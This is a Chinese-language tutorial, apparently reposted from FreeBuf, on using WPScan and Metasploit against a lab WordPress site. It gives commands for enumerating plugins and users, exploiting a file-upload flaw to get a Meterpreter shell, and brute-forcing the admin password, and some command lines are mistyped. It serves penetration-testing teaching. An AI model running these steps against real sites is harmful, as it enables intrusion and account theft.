**严正声明：本文仅限于技术探讨，严禁用于其他目的。**

## 写在前面的话

> 在这篇文章中，我将告诉大家如何使用WPScan来对WordPress站点进行安全测试。

 **WPScan是Kali
Linux默认自带的一款漏洞扫描工具，它采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括主题漏洞、插件漏洞和WordPress本身的漏洞。最新版本WPScan的数据库中包含超过18000种插件漏洞和2600种主题漏洞，并且支持最新版本的WordPress。值得注意的是，它不仅能够扫描类似robots.txt这样的敏感文件，而且还能够检测当前已启用的插件和其他功能。**

接下来，让我们进入正题…

## 工具安装与运行

Kali Linux默认自带了WPScan，你也可以使用下列命令在自己的设备中安装WPScan：

    
    
    git clone https://github.com/wpscanteam/wpscan.git

![2.png如何对Wordpress站点进行安全测试](https://image.3001.net/images/20180612/15287969947445.png!small)

切换到WPScan目录中，运行下列命令查看帮助信息：

    
    
    ./wpscan.rb–h

![3.png如何对Wordpress站点进行安全测试](https://image.3001.net/images/20180612/15287970095523.png!small)

你也可以使用以下命令更新漏洞库：

    
    
    wpscan -update

## 扫描WordPress站点

我们可以使用–enumerate选项来扫描并发现关于目标站点主题、插件和用户名信息。输入下列命令开始对服务器进行扫描：

    
    
    ./wpscan.rb –u http://192.168.0.101/wordpress/

如果你不知道目标服务器的IP地址，你可以直接输入URL地址。下面给出的是扫描结果：

![如何对Wordpress站点进行安全测试](https://image.3001.net/images/20180612/15287970353826.png!small)

从结果中可以看到，服务器信息为Apache/2.4.6，PHP /5.5.9，WordPress
v4.8.1。我们还发现，上传目录开启了目录监听功能，因此任何人都可以通过访问wp-content/uploads来查看目录中的上传内容。

### 主题扫描

使用下列命令对主题进行扫描：

    
    
    ./wpsca.rb –u http://192.168.0.101/wordpress --enumerate t

![5.png如何对Wordpress站点进行安全测试](https://image.3001.net/images/20180612/15287970612710.png!small)

使用下列命令扫描主题中存在的漏洞：

    
    
    ./wpscan.rb -u http://192.168.0.101/wordpress/ --enumerate vt

![如何对Wordpress站点进行安全测试](https://image.3001.net/images/20180612/15287970796857.png!small)

### 插件扫描

插件可以扩展WordPress站点的功能，但很多插件中都存在安全漏洞，而这也会给攻击者提供可乘之机。

我们可以使用下列命令扫描WordPress站点中安装的插件：

    
    
    ./wpscan.rb -u http://192.168.0.101/wordpress/ --enumerate p

![7.png](https://image.3001.net/images/20180612/15287971048516.png!small)

我们可以看到该网站中安装了Akismet v3.3.3，pixbay-images v2.14，wptouch v3.4.3以及很多其他的插件。

![如何对Wordpress站点进行安全测试](https://image.3001.net/images/20180612/15287971138698.png!small)

接下来，我们可以使用下列命令来扫描目标插件中的安全漏洞：

    
    
    ./wpscan.rb -u http://192.168.0.101/wordpress/ --enumerate vp

![如何对Wordpress站点进行安全测试](https://image.3001.net/images/20180612/15287971322995.png!small)

我们可以从扫描结果中看到这三款插件中存在的漏洞以及利用路径：

![如何对Wordpress站点进行安全测试](https://image.3001.net/images/20180612/15287971412356.png!small)

## 结合Metasploit利用插件中的漏洞

接下来，我们将用第一个插件中的任意文件上传漏洞来进行漏洞利用演示，该漏洞允许我们上传恶意文件并实现远程代码执行。

打开终端窗口并输入下列命令：

    
    
    useexploit/unix/webapp/wp_reflexgallery_file_upload
    msfexploit(wp_reflexgallery_file_upload) > set rhost 192.168.0.101
    msfexploit(wp_reflexgallery_file_upload) > set targetURI /wordpress/
    msfexploit(wp_reflexgallery_file_upload) > exploit

你将看到终端与目标设备建立了Meterpreter会话，你可以输入下列命令查看目标系统信息：

    
    
    Sysinfo

![如何对Wordpress站点进行安全测试](https://image.3001.net/images/20180612/15287971789768.png!small)

## 枚举WordPress用户名

我们可以在终端中输入下列命令来枚举WordPress用户名：

    
    
    ./wpscan.rb -u http://192.168.0.101/wordpress/ --enumerate u

![如何对Wordpress站点进行安全测试](https://image.3001.net/images/20180612/15287972068549.png!small)

接下来工具将导出用户名数据表，你可以看到用户名以及对应的ID信息。

当然了，你也可以使用下列命令枚举出所有的内容：

    
    
    ./wpscan.rb -u http://192.168.0.101/wordpress/ -e at -e ap -e u
    –e at : enumerate all themes of targeted website
    –e ap: enumerate all plugins of targeted website
    –e u: enumerate all usernames of targeted website

![如何对Wordpress站点进行安全测试](https://image.3001.net/images/20180612/15287972309586.png!small)  

## 使用WPScan进行暴力破解

在进行暴力破解攻击之前，我们需要创建对应的字典文件。输入下列命令：

    
    
    ./wpscan.rb –u http://192.168.0.101/wordpress/ --wordlist /root/Desktop/dict.txt --usernameadmin

![如何对Wordpress站点进行安全测试](https://image.3001.net/images/20180612/1528797258105.png!small)

如果找到了相匹配的用户名与密码，工具将直接以admin:password的形式显示出来：

![如何对Wordpress站点进行安全测试](https://image.3001.net/images/20180612/15287972677985.png!small)

 *** 参考来源：[hackmydevice](https://www.hackmydevice.com/2018/05/how-to-hack-wordpress-site-using-wpscan.html)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

